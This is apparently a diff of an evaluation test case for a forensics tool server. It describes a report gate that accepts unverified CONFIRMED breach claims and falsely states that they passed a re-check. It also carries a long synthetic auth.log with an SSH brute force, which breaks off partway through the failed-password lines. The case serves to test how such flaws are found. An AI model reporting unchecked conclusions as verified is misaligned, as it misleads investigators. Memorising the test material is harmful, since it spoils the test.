@@ -8,22 +8,508 @@ server: findevil
 variant: findevil-d1a8d25
 commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
 display: response
-level: mcp
-realism: possible
-realism_ko: "모델은 측면 이동처럼 여덟 가지 검증 유형에 없는 결론도 확정으로 내므로 이 경로를 실제로 탄다. 다만 확정 목록의 그 줄에는 `cited` 표시가 붙는다."
+level: model
+realism: common
+realism_ko: "서버 지침은 확정 결론을 `finalize_report`로만 내게 하고, 실제 침해 조사의 핵심 결론(유출, 측면 이동)은 여덟 가지 검증 유형에 없다. 그래서 모델은 이 경로를 실제로 타고, 게이트가 받아 준 결론을 그대로 확정으로 보고한다."
 coverage: full
-summary: A CONFIRMED lateral-movement claim citing auth.log line 7 of a one-line log, where nothing supports it, is ACCEPTED, and the acceptance text says every CONFIRMED claim passed an independent re-check, although the description calls this gate architectural and the claim was never checked.
-summary_ko: "한 줄짜리 `auth.log`의 7번째 줄을 인용한 측면 이동 CONFIRMED 주장이 근거 없이 ACCEPTED된다. 수락 문구는 모든 CONFIRMED 주장이 독립 재검사를 통과했다고 쓰지만, 이 주장은 검사되지 않았다."
+summary: On a busy Ubuntu web host where deploy was brute-forced from 185.220.101.47 and its shell history shows the app secrets packed and sent with curl -T, finalize_report accepts CONFIRMED exfiltration and lateral-movement claims on a citation alone (and a lateral-movement claim citing line 9999 of a 424-line auth.log), and the acceptance text says every CONFIRMED claim passed an independent re-check, so the exfiltration, shown only by the commands in the history, can be reported as CONFIRMED.
+summary_ko: "`deploy` 계정이 185.220.101.47에서 무차별 대입으로 뚫리고 셸 기록에 앱 비밀 정보를 묶어 `curl -T`로 보낸 흔적이 있는 바쁜 Ubuntu 웹 서버에서, `finalize_report`는 유출·측면 이동 CONFIRMED 주장을 인용 글만 보고 받아들인다(424줄 `auth.log`의 9999번째 줄을 인용한 주장도 받아들인다). 수락 문구는 모든 CONFIRMED 주장이 독립 재검사를 통과했다고 쓴다. 그래서 셸 기록의 명령만 있고 전송 성공은 확인되지 않은 유출이 확정으로 보고될 수 있다."
 defect_ko: "이 서버는 인용 글만 있으면 확정 주장을 받아들이고, 모든 확정 주장이 재검사를 통과했다고 쓴다. 검사하지 않은 주장은 검사하지 않았다고 알려야 한다. 모델은 검증된 결론이라고 잘못 안다."
-setup_ko: "정상 로그인 한 줄만 있는 `auth.log`를 두고, 그 파일에 없는 7번째 줄을 근거로 측면 이동을 확정한다고 요청했다."
+setup_ko: "5일치 cron·사내 SSH 로그인·sudo·스캐너 기록이 든 `auth.log`에 `deploy` 무차별 대입과 로그인 성공을 넣고, `deploy`의 `.bash_history`에 앱 비밀 정보를 묶어 `curl -T`로 올리고 내부 서버로 SSH 접속한 명령을 넣었다. 스크립트 호출은 파일에 없는 9999번째 줄을 근거로 측면 이동을 확정한다고 요청한다."
 fixture:
-  - path: auth.log
-    text: "Apr 12 10:00:00 web01 sshd[2211]: Accepted publickey for alice from 203.0.113.5 port 51122 ssh2\n"
+  # A busy Ubuntu web host: five days of cron, office SSH logins, sudo and
+  # scanner noise in auth.log; on Apr 13 a password brute force of deploy from
+  # 185.220.101.47 succeeds, and deploy's history packs the app secrets and
+  # uploads them with curl -T, then SSHes to 10.20.0.31. Brute force and login
+  # are verifiable claim types; exfiltration and lateral movement are not, so
+  # finalize_report accepts them on the citation alone.
+  - path: fs/var/log/auth.log
+    text: |
+      Apr 10 00:17:00 web01 CRON[3023]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 00:17:01 web01 CRON[3023]: pam_unix(cron:session): session closed for user root
+      Apr 10 01:17:00 web01 CRON[3049]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 01:17:01 web01 CRON[3049]: pam_unix(cron:session): session closed for user root
+      Apr 10 02:17:00 web01 CRON[3077]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 02:17:01 web01 CRON[3077]: pam_unix(cron:session): session closed for user root
+      Apr 10 03:09:19 web01 sshd[3795]: Invalid user oracle from 141.110.108.80 port 57220
+      Apr 10 03:09:20 web01 sshd[3795]: Connection closed by invalid user oracle 141.110.108.80 port 34037 [preauth]
+      Apr 10 03:17:00 web01 CRON[3085]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 03:17:01 web01 CRON[3085]: pam_unix(cron:session): session closed for user root
+      Apr 10 04:17:00 web01 CRON[3120]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 04:17:01 web01 CRON[3120]: pam_unix(cron:session): session closed for user root
+      Apr 10 05:17:00 web01 CRON[3149]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 05:17:01 web01 CRON[3149]: pam_unix(cron:session): session closed for user root
+      Apr 10 06:17:00 web01 CRON[3180]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 06:17:01 web01 CRON[3180]: pam_unix(cron:session): session closed for user root
+      Apr 10 07:17:00 web01 CRON[3216]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 07:17:01 web01 CRON[3216]: pam_unix(cron:session): session closed for user root
+      Apr 10 08:17:00 web01 CRON[3236]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 08:17:01 web01 CRON[3236]: pam_unix(cron:session): session closed for user root
+      Apr 10 09:17:00 web01 CRON[3262]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 09:17:01 web01 CRON[3262]: pam_unix(cron:session): session closed for user root
+      Apr 10 10:11:07 web01 sshd[3669]: Accepted publickey for bob from 10.20.0.37 port 49561 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 10 10:11:07 web01 sshd[3669]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 10 10:17:00 web01 CRON[3302]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 10:17:01 web01 CRON[3302]: pam_unix(cron:session): session closed for user root
+      Apr 10 10:31:24 web01 sshd[3653]: Accepted publickey for deploy from 10.20.0.37 port 43370 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 10 10:31:24 web01 sshd[3653]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 10 10:40:01 web01 sshd[3669]: pam_unix(sshd:session): session closed for user bob
+      Apr 10 11:17:00 web01 CRON[3317]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 11:17:01 web01 CRON[3317]: pam_unix(cron:session): session closed for user root
+      Apr 10 11:30:12 web01 sshd[3653]: pam_unix(sshd:session): session closed for user deploy
+      Apr 10 12:13:13 web01 sshd[3672]: Accepted publickey for deploy from 10.20.0.37 port 55098 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 10 12:13:13 web01 sshd[3672]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 10 12:17:00 web01 CRON[3350]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 12:17:01 web01 CRON[3350]: pam_unix(cron:session): session closed for user root
+      Apr 10 12:29:49 web01 sshd[3672]: pam_unix(sshd:session): session closed for user deploy
+      Apr 10 13:17:00 web01 CRON[3384]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 13:17:01 web01 CRON[3384]: pam_unix(cron:session): session closed for user root
+      Apr 10 13:18:33 web01 sshd[3714]: Accepted publickey for alice from 10.20.0.22 port 48858 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 10 13:18:33 web01 sshd[3714]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 10 14:14:45 web01 sshd[3714]: pam_unix(sshd:session): session closed for user alice
+      Apr 10 14:17:00 web01 CRON[3400]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 14:17:01 web01 CRON[3400]: pam_unix(cron:session): session closed for user root
+      Apr 10 14:55:39 web01 sshd[3662]: Accepted publickey for bob from 10.20.0.22 port 59547 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 10 14:55:39 web01 sshd[3662]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 10 15:10:50 web01 sshd[3662]: pam_unix(sshd:session): session closed for user bob
+      Apr 10 15:17:00 web01 CRON[3419]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 15:17:01 web01 CRON[3419]: pam_unix(cron:session): session closed for user root
+      Apr 10 16:17:00 web01 CRON[3446]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 16:17:01 web01 CRON[3446]: pam_unix(cron:session): session closed for user root
+      Apr 10 17:17:00 web01 CRON[3474]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 17:17:01 web01 CRON[3474]: pam_unix(cron:session): session closed for user root
+      Apr 10 17:26:49 web01 sshd[3825]: Invalid user test from 103.72.37.89 port 36966
+      Apr 10 17:26:50 web01 sshd[3825]: Connection closed by invalid user test 103.72.37.89 port 56107 [preauth]
+      Apr 10 17:51:21 web01 sshd[3706]: Accepted publickey for alice from 10.20.0.37 port 53743 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 10 17:51:21 web01 sshd[3706]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 10 17:53:21 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/error.log
+      Apr 10 17:53:21 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+      Apr 10 17:53:22 web01 sudo: pam_unix(sudo:session): session closed for user root
+      Apr 10 18:17:00 web01 CRON[3502]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 18:17:01 web01 CRON[3502]: pam_unix(cron:session): session closed for user root
+      Apr 10 18:38:20 web01 sshd[3706]: pam_unix(sshd:session): session closed for user alice
+      Apr 10 19:17:00 web01 CRON[3540]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 19:17:01 web01 CRON[3540]: pam_unix(cron:session): session closed for user root
+      Apr 10 19:52:12 web01 sshd[3724]: Invalid user admin from 103.26.72.74 port 36444
+      Apr 10 19:52:13 web01 sshd[3724]: Connection closed by invalid user admin 103.26.72.74 port 57512 [preauth]
+      Apr 10 20:17:00 web01 CRON[3547]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 20:17:01 web01 CRON[3547]: pam_unix(cron:session): session closed for user root
+      Apr 10 21:17:00 web01 CRON[3584]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 21:17:01 web01 CRON[3584]: pam_unix(cron:session): session closed for user root
+      Apr 10 22:01:30 web01 sshd[3757]: Invalid user oracle from 45.66.248.201 port 54909
+      Apr 10 22:01:31 web01 sshd[3757]: Connection closed by invalid user oracle 45.66.248.201 port 42987 [preauth]
+      Apr 10 22:17:00 web01 CRON[3599]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 22:17:01 web01 CRON[3599]: pam_unix(cron:session): session closed for user root
+      Apr 10 23:17:00 web01 CRON[3617]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 10 23:17:01 web01 CRON[3617]: pam_unix(cron:session): session closed for user root
+      Apr 11 00:17:00 web01 CRON[3833]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 00:17:01 web01 CRON[3833]: pam_unix(cron:session): session closed for user root
+      Apr 11 01:17:00 web01 CRON[3855]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 01:17:01 web01 CRON[3855]: pam_unix(cron:session): session closed for user root
+      Apr 11 02:17:00 web01 CRON[3892]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 02:17:01 web01 CRON[3892]: pam_unix(cron:session): session closed for user root
+      Apr 11 03:17:00 web01 CRON[3900]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 03:17:01 web01 CRON[3900]: pam_unix(cron:session): session closed for user root
+      Apr 11 04:17:00 web01 CRON[3932]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 04:17:01 web01 CRON[3932]: pam_unix(cron:session): session closed for user root
+      Apr 11 05:17:00 web01 CRON[3972]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 05:17:01 web01 CRON[3972]: pam_unix(cron:session): session closed for user root
+      Apr 11 06:17:00 web01 CRON[3999]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 06:17:01 web01 CRON[3999]: pam_unix(cron:session): session closed for user root
+      Apr 11 07:17:00 web01 CRON[4013]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 07:17:01 web01 CRON[4013]: pam_unix(cron:session): session closed for user root
+      Apr 11 08:17:00 web01 CRON[4020]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 08:17:01 web01 CRON[4020]: pam_unix(cron:session): session closed for user root
+      Apr 11 09:04:56 web01 sshd[4469]: Invalid user admin from 103.201.85.169 port 33639
+      Apr 11 09:04:57 web01 sshd[4469]: Connection closed by invalid user admin 103.201.85.169 port 44429 [preauth]
+      Apr 11 09:17:00 web01 CRON[4058]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 09:17:01 web01 CRON[4058]: pam_unix(cron:session): session closed for user root
+      Apr 11 10:14:02 web01 sshd[4361]: Accepted publickey for alice from 10.20.0.37 port 47891 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 11 10:14:02 web01 sshd[4361]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 11 10:16:02 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+      Apr 11 10:16:02 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+      Apr 11 10:16:03 web01 sudo: pam_unix(sudo:session): session closed for user root
+      Apr 11 10:17:00 web01 CRON[4082]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 10:17:01 web01 CRON[4082]: pam_unix(cron:session): session closed for user root
+      Apr 11 10:43:57 web01 sshd[4361]: pam_unix(sshd:session): session closed for user alice
+      Apr 11 11:17:00 web01 CRON[4106]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 11:17:01 web01 CRON[4106]: pam_unix(cron:session): session closed for user root
+      Apr 11 11:27:28 web01 sshd[4386]: Accepted publickey for bob from 10.20.0.22 port 55589 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 11 11:27:28 web01 sshd[4386]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 11 12:08:35 web01 sshd[4386]: pam_unix(sshd:session): session closed for user bob
+      Apr 11 12:17:00 web01 CRON[4131]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 12:17:01 web01 CRON[4131]: pam_unix(cron:session): session closed for user root
+      Apr 11 12:50:00 web01 sshd[4355]: Accepted publickey for alice from 10.20.0.14 port 44509 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 11 12:50:00 web01 sshd[4355]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 11 13:01:55 web01 sshd[4440]: Accepted publickey for bob from 10.20.0.37 port 51587 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 11 13:01:55 web01 sshd[4440]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 11 13:17:00 web01 CRON[4139]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 13:17:01 web01 CRON[4139]: pam_unix(cron:session): session closed for user root
+      Apr 11 13:44:17 web01 sshd[4440]: pam_unix(sshd:session): session closed for user bob
+      Apr 11 13:46:08 web01 sshd[4355]: pam_unix(sshd:session): session closed for user alice
+      Apr 11 14:06:33 web01 sshd[4400]: Accepted publickey for alice from 10.20.0.14 port 59477 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 11 14:06:33 web01 sshd[4400]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 11 14:17:00 web01 CRON[4163]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 14:17:01 web01 CRON[4163]: pam_unix(cron:session): session closed for user root
+      Apr 11 14:45:10 web01 sshd[4400]: pam_unix(sshd:session): session closed for user alice
+      Apr 11 15:17:00 web01 CRON[4187]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 15:17:01 web01 CRON[4187]: pam_unix(cron:session): session closed for user root
+      Apr 11 15:51:06 web01 sshd[4500]: Invalid user user from 193.122.43.8 port 45817
+      Apr 11 15:51:07 web01 sshd[4500]: Connection closed by invalid user user 193.122.43.8 port 44065 [preauth]
+      Apr 11 16:17:00 web01 CRON[4202]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 16:17:01 web01 CRON[4202]: pam_unix(cron:session): session closed for user root
+      Apr 11 17:17:00 web01 CRON[4227]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 17:17:01 web01 CRON[4227]: pam_unix(cron:session): session closed for user root
+      Apr 11 18:17:00 web01 CRON[4254]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 18:17:01 web01 CRON[4254]: pam_unix(cron:session): session closed for user root
+      Apr 11 19:17:00 web01 CRON[4259]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 19:17:01 web01 CRON[4259]: pam_unix(cron:session): session closed for user root
+      Apr 11 20:17:00 web01 CRON[4293]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 20:17:01 web01 CRON[4293]: pam_unix(cron:session): session closed for user root
+      Apr 11 21:17:00 web01 CRON[4300]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 21:17:01 web01 CRON[4300]: pam_unix(cron:session): session closed for user root
+      Apr 11 22:17:00 web01 CRON[4338]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 22:17:01 web01 CRON[4338]: pam_unix(cron:session): session closed for user root
+      Apr 11 23:17:00 web01 CRON[4352]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 11 23:17:01 web01 CRON[4352]: pam_unix(cron:session): session closed for user root
+      Apr 12 00:17:00 web01 CRON[4533]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 00:17:01 web01 CRON[4533]: pam_unix(cron:session): session closed for user root
+      Apr 12 01:17:00 web01 CRON[4548]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 01:17:01 web01 CRON[4548]: pam_unix(cron:session): session closed for user root
+      Apr 12 02:17:00 web01 CRON[4577]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 02:17:01 web01 CRON[4577]: pam_unix(cron:session): session closed for user root
+      Apr 12 03:17:00 web01 CRON[4606]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 03:17:01 web01 CRON[4606]: pam_unix(cron:session): session closed for user root
+      Apr 12 04:17:00 web01 CRON[4612]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 04:17:01 web01 CRON[4612]: pam_unix(cron:session): session closed for user root
+      Apr 12 05:17:00 web01 CRON[4619]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 05:17:01 web01 CRON[4619]: pam_unix(cron:session): session closed for user root
+      Apr 12 06:17:00 web01 CRON[4653]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 06:17:01 web01 CRON[4653]: pam_unix(cron:session): session closed for user root
+      Apr 12 07:17:00 web01 CRON[4681]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 07:17:01 web01 CRON[4681]: pam_unix(cron:session): session closed for user root
+      Apr 12 07:50:08 web01 sshd[5288]: Invalid user user from 103.154.55.61 port 33198
+      Apr 12 07:50:09 web01 sshd[5288]: Connection closed by invalid user user 103.154.55.61 port 42663 [preauth]
+      Apr 12 08:17:00 web01 CRON[4717]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 08:17:01 web01 CRON[4717]: pam_unix(cron:session): session closed for user root
+      Apr 12 08:52:10 web01 sshd[5124]: Accepted publickey for bob from 10.20.0.14 port 64352 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 12 08:52:10 web01 sshd[5124]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 12 09:17:00 web01 CRON[4751]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 09:17:01 web01 CRON[4751]: pam_unix(cron:session): session closed for user root
+      Apr 12 09:51:09 web01 sshd[5206]: Accepted publickey for bob from 10.20.0.14 port 60903 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 12 09:51:09 web01 sshd[5206]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 12 09:55:09 web01 sshd[5124]: pam_unix(sshd:session): session closed for user bob
+      Apr 12 10:17:00 web01 CRON[4764]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 10:17:01 web01 CRON[4764]: pam_unix(cron:session): session closed for user root
+      Apr 12 10:18:14 web01 sshd[5206]: pam_unix(sshd:session): session closed for user bob
+      Apr 12 10:23:04 web01 sshd[5266]: Invalid user ubuntu from 167.249.169.79 port 42320
+      Apr 12 10:23:05 web01 sshd[5266]: Connection closed by invalid user ubuntu 167.249.169.79 port 38200 [preauth]
+      Apr 12 11:17:00 web01 CRON[4793]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 11:17:01 web01 CRON[4793]: pam_unix(cron:session): session closed for user root
+      Apr 12 11:47:41 web01 sshd[5240]: Accepted publickey for deploy from 10.20.0.37 port 61740 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 12 11:47:41 web01 sshd[5240]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 12 12:17:00 web01 CRON[4819]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 12:17:01 web01 CRON[4819]: pam_unix(cron:session): session closed for user root
+      Apr 12 12:20:52 web01 sshd[5240]: pam_unix(sshd:session): session closed for user deploy
+      Apr 12 13:17:00 web01 CRON[4842]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 13:17:01 web01 CRON[4842]: pam_unix(cron:session): session closed for user root
+      Apr 12 13:20:05 web01 sshd[5191]: Accepted publickey for deploy from 10.20.0.37 port 58419 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 12 13:20:05 web01 sshd[5191]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 12 13:43:50 web01 sshd[5191]: pam_unix(sshd:session): session closed for user deploy
+      Apr 12 14:17:00 web01 CRON[4855]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 14:17:01 web01 CRON[4855]: pam_unix(cron:session): session closed for user root
+      Apr 12 15:17:00 web01 CRON[4891]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 15:17:01 web01 CRON[4891]: pam_unix(cron:session): session closed for user root
+      Apr 12 15:33:03 web01 sshd[5259]: Accepted publickey for deploy from 10.20.0.37 port 57478 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 12 15:33:03 web01 sshd[5259]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 12 15:42:55 web01 sshd[5259]: pam_unix(sshd:session): session closed for user deploy
+      Apr 12 16:17:00 web01 CRON[4917]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 16:17:01 web01 CRON[4917]: pam_unix(cron:session): session closed for user root
+      Apr 12 17:17:00 web01 CRON[4952]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 17:17:01 web01 CRON[4952]: pam_unix(cron:session): session closed for user root
+      Apr 12 17:39:49 web01 sshd[5158]: Accepted publickey for alice from 10.20.0.22 port 49806 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 12 17:39:49 web01 sshd[5158]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 12 17:42:41 web01 sshd[5195]: Accepted publickey for bob from 10.20.0.22 port 40392 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 12 17:42:41 web01 sshd[5195]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 12 17:52:36 web01 sshd[5158]: pam_unix(sshd:session): session closed for user alice
+      Apr 12 18:17:00 web01 CRON[4967]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 18:17:01 web01 CRON[4967]: pam_unix(cron:session): session closed for user root
+      Apr 12 18:27:47 web01 sshd[5195]: pam_unix(sshd:session): session closed for user bob
+      Apr 12 19:17:00 web01 CRON[4998]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 19:17:01 web01 CRON[4998]: pam_unix(cron:session): session closed for user root
+      Apr 12 20:17:00 web01 CRON[5016]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 20:17:01 web01 CRON[5016]: pam_unix(cron:session): session closed for user root
+      Apr 12 21:17:00 web01 CRON[5031]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 21:17:01 web01 CRON[5031]: pam_unix(cron:session): session closed for user root
+      Apr 12 22:17:00 web01 CRON[5070]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 22:17:01 web01 CRON[5070]: pam_unix(cron:session): session closed for user root
+      Apr 12 23:17:00 web01 CRON[5090]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 12 23:17:01 web01 CRON[5090]: pam_unix(cron:session): session closed for user root
+      Apr 13 00:17:00 web01 CRON[5304]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 00:17:01 web01 CRON[5304]: pam_unix(cron:session): session closed for user root
+      Apr 13 01:17:00 web01 CRON[5315]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 01:17:01 web01 CRON[5315]: pam_unix(cron:session): session closed for user root
+      Apr 13 02:11:00 web01 sshd[6864]: Failed password for deploy from 185.220.101.47 port 46625 ssh2
+      Apr 13 02:11:03 web01 sshd[6888]: Failed password for deploy from 185.220.101.47 port 37820 ssh2
+      Apr 13 02:11:06 web01 sshd[6896]: Failed password for deploy from 185.220.101.47 port 57296 ssh2
+      Apr 13 02:11:09 web01 sshd[6920]: Failed password for deploy from 185.220.101.47 port 51421 ssh2
+      Apr 13 02:11:12 web01 sshd[6947]: Failed password for deploy from 185.220.101.47 port 52667 ssh2
+      Apr 13 02:11:15 web01 sshd[6970]: Failed password for deploy from 185.220.101.47 port 55007 ssh2
+      Apr 13 02:11:18 web01 sshd[7006]: Failed password for deploy from 185.220.101.47 port 40637 ssh2
+      Apr 13 02:11:21 web01 sshd[7038]: Failed password for deploy from 185.220.101.47 port 31093 ssh2
+      Apr 13 02:11:24 web01 sshd[7068]: Failed password for deploy from 185.220.101.47 port 47258 ssh2
+      Apr 13 02:11:27 web01 sshd[7077]: Failed password for deploy from 185.220.101.47 port 37976 ssh2
+      Apr 13 02:11:30 web01 sshd[7080]: Failed password for deploy from 185.220.101.47 port 50499 ssh2
+      Apr 13 02:11:33 web01 sshd[7120]: Failed password for deploy from 185.220.101.47 port 58557 ssh2
+      Apr 13 02:11:36 web01 sshd[7139]: Failed password for deploy from 185.220.101.47 port 50024 ssh2
+      Apr 13 02:11:39 web01 sshd[7161]: Failed password for deploy from 185.220.101.47 port 56203 ssh2
+      Apr 13 02:11:42 web01 sshd[7187]: Failed password for deploy from 185.220.101.47 port 44200 ssh2
+      Apr 13 02:11:45 web01 sshd[7205]: Failed password for deploy from 185.220.101.47 port 37704 ssh2
+      Apr 13 02:11:48 web01 sshd[7237]: Failed password for deploy from 185.220.101.47 port 40403 ssh2
+      Apr 13 02:11:51 web01 sshd[7240]: Failed password for deploy from 185.220.101.47 port 49780 ssh2
+      Apr 13 02:11:54 web01 sshd[7273]: Failed password for deploy from 185.220.101.47 port 44178 ssh2
+      Apr 13 02:11:57 web01 sshd[7301]: Failed password for deploy from 185.220.101.47 port 46519 ssh2
+      Apr 13 02:12:00 web01 sshd[7311]: Failed password for deploy from 185.220.101.47 port 31324 ssh2
+      Apr 13 02:12:03 web01 sshd[7333]: Failed password for deploy from 185.220.101.47 port 35731 ssh2
+      Apr 13 02:12:06 web01 sshd[7342]: Failed password for deploy from 185.220.101.47 port 58716 ssh2
+      Apr 13 02:12:09 web01 sshd[7354]: Failed password for deploy from 185.220.101.47 port 55509 ssh2
+      Apr 13 02:12:12 web01 sshd[7380]: Failed password for deploy from 185.220.101.47 port 30539 ssh2
+      Apr 13 02:12:15 web01 sshd[7406]: Failed password for deploy from 185.220.101.47 port 35068 ssh2
+      Apr 13 02:12:18 web01 sshd[7417]: Failed password for deploy from 185.220.101.47 port 55957 ssh2
